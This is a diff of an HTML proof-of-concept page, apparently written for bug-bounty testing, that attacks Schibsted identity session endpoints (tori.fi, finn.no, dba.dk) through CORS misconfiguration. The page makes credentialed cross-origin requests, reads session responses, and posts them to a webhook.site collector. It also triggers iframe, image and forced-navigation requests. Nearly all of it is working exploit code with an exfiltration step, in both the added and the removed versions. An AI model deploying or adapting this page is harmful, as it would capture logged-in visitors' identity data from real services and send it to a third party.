@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Schibsted Identity CORS Conditional Exploit PoC</title>
+<title>Schibsted Identity CORS Multi-Vector Tester</title>
 
 <style>
 body {
     font-family: Arial;
-    padding: 20px;
     background: #f4f4f4;
+    padding: 20px;
 }
 
 h1 {
@@ -16,7 +16,7 @@ h1 {
 }
 
 button {
-    padding: 12px 20px;
+    padding: 14px 20px;
     font-size: 16px;
     background: #c62828;
     color: white;
@@ -24,21 +24,19 @@ button {
     cursor: pointer;
 }
 
-button:hover {
-    background: #8e0000;
-}
-
 pre {
     background: #111;
     color: #0f0;
     padding: 15px;
+    max-height: 500px;
     overflow: auto;
-    max-height: 400px;
 }
 
-#status {
-    margin-top: 15px;
-    font-weight: bold;
+iframe {
+    width: 100%;
+    height: 200px;
+    border: 1px solid #ccc;
+    margin-top: 10px;
 }
 </style>
 
@@ -46,92 +44,86 @@ pre {
 
 <body>
 
-<h1>🔍 Schibsted CORS Identity Endpoint Tester</h1>
+<h1>🔐 Identity CORS Multi-Vector Exploit Tester</h1>
 
 <p>
-<strong>Purpose:</strong> Demonstrates credentialed CORS behavior and detects whether
-session cookies are transmitted cross-origin.
+Tests multiple browser behaviors against identity session endpoints.
 </p>
 
-<p>
-<strong>This PoC tests:</strong>
-</p>
+<button onclick="runAllTests()">
+🚨 Run All Tests
+</button>
 
-<ul>
-<li>CORS Origin reflection</li>
-<li>Access-Control-Allow-Credentials usage</li>
-<li>Cross-site cookie transmission</li>
-<li>Conditional session data exposure</li>
-</ul>
-
-<button onclick="runTest()">🚨 Run Cross-Origin Session Test</button>
-
-<div id="status"></div>
 <pre id="output"></pre>
+
+<div id="iframeContainer"></div>
 
 <script>
 
 /* =========================
-   CONFIGURATION
+   CONFIG
 ========================= */
 
-const WEBHOOK_URL =
-"https://webhook.site/59167735-3d9b-4830-b6d9-ddebc0d5663c";
+const WEBHOOK =
+"https://webhook.site/YOUR-ID";
 
 const ENDPOINTS = [
 
-"https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3&redirect_uri=https%3A%2F%2Fwww.tori.fi%2F",
+"https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3",
 
-"https://session.login.pre.identity.m10s.io/v2/session",
+"https://id.finn.no/v2/session",
 
-"https://session.login.dev.identity.m10s.io/v2/session"
+"https://id.dba.dk/v2/session"
 
 ];
 
 
 /* =========================
-   MAIN TEST LOGIC
+   LOGGER
 ========================= */
 
-async function runTest() {
+function log(msg) {
 
-const status = document.getElementById("status");
-const output = document.getElementById("output");
-
-output.textContent = "";
-
-status.textContent =
-"🔄 Testing cross-origin credential behavior...";
-
-status.style.color = "orange";
-
-for (const endpoint of ENDPOINTS) {
-
-await testEndpoint(endpoint);
-
-}
-
-status.textContent =
-"✅ Testing completed. Review output below.";
-
-status.style.color = "green";
+document.getElementById("output").textContent +=
+msg + "\n";
 
 }
 
 
 /* =========================
-   TEST SINGLE ENDPOINT
+   MASTER RUNNER
 ========================= */
 
-async function testEndpoint(endpoint) {
+async function runAllTests() {
 
-const output = document.getElementById("output");
+log("Starting multi-vector testing...\n");
 
-output.textContent +=
-"\n============================\n";
+for (const endpoint of ENDPOINTS) {
 
-output.textContent +=
-"Testing:\n" + endpoint + "\n\n";
+await fetchTest(endpoint);
+
+iframeTest(endpoint);
+
+imageTest(endpoint);
+
+navigationTest(endpoint);
+
+}
+
+log("\nAll tests triggered.");
+
+}
+
+
+/* =========================
+   FETCH TEST
+========================= */
+
+async function fetchTest(endpoint) {
+
+log("=== FETCH TEST ===");
+
+log(endpoint);
 
 try {
 
@@ -143,27 +135,8 @@ credentials: "include"
 
 });
 
-let bodyText =
+const text =
 await response.text();
-
-/* Try JSON parse */
-
-let parsed = null;
-
-try {
-
-parsed =
-JSON.parse(bodyText);
-
-} catch (e) {
-
-parsed =
-bodyText;
-
-}
-
-
-/* Extract headers */
 
 const corsOrigin =
 response.headers.get(
@@ -175,94 +148,121 @@ response.headers.get(
 "Access-Control-Allow-Credentials"
 );
 
-
-/* Detect cookie behavior */
-
-let cookieStatus =
-"UNKNOWN";
-
-if (
-bodyText.includes(
-"Session cookie"
-)
-) {
-
-cookieStatus =
-"COOKIE NOT SENT (Likely SameSite=Lax/Strict)";
-
-}
-else if (
-response.status === 200
-) {
-
-cookieStatus =
-"COOKIE SENT (Potential Exploit Condition)";
-
-}
-
-
-/* Build result */
-
 const result = {
 
 endpoint: endpoint,
 
+method: "fetch",
+
 status: response.status,
 
-cors: {
+cors_origin: corsOrigin,
 
-"Access-Control-Allow-Origin":
-corsOrigin,
-
-"Access-Control-Allow-Credentials":
-corsCreds
-
-},
-
-cookie_behavior:
-cookieStatus,
+cors_credentials: corsCreds,
 
 response_preview:
-parsed
+text.substring(0, 300)
 
 };
 
+log(JSON.stringify(result, null, 2));
 
-output.textContent +=
-JSON.stringify(result, null, 2);
+await exfil(result);
 
-output.textContent += "\n";
+}
+catch (e) {
+
+log("Fetch error: " + e.message);
+
+}
+
+}
 
 
-/* Conditional Exfiltration */
+/* =========================
+   IFRAME TEST
+========================= */
 
-if (
-cookieStatus.includes("SENT")
-) {
+function iframeTest(endpoint) {
 
-await fetch(
-WEBHOOK_URL,
-{
+log("=== IFRAME TEST ===");
+
+const iframe =
+document.createElement("iframe");
+
+iframe.src = endpoint;
+
+document
+.getElementById("iframeContainer")
+.appendChild(iframe);
+
+}
+
+
+/* =========================
+   IMAGE TEST
+========================= */
+
+function imageTest(endpoint) {
+
+log("=== IMAGE TEST ===");
+
+const img =
+new Image();
+
+img.src = endpoint;
+
+}
+
+
+/* =========================
+   NAVIGATION TEST
+========================= */
+
+function navigationTest(endpoint) {
+
+log("=== NAVIGATION TEST ===");
+
+setTimeout(() => {
+
+log("Navigating to:");
+
+log(endpoint);
+
+window.location = endpoint;
+
+}, 8000);
+
+}
+
+
+/* =========================
+   WEBHOOK EXFIL
+========================= */
+
+async function exfil(data) {
+
+try {
+
+await fetch(WEBHOOK, {
+
 method: "POST",
+
 headers: {
+
 "Content-Type":
 "application/json"
+
 },
-body: JSON.stringify(result)
-}
-);
 
-output.textContent +=
-"\n⚠️ DATA EXFILTRATED TO WEBHOOK\n";
+body: JSON.stringify(data)
+
+});
 
 }
+catch (e) {
 
-
-}
-catch (err) {
-
-output.textContent +=
-"Error: " + err.message + "\n";
+log("Webhook failed.");
 
 }
 
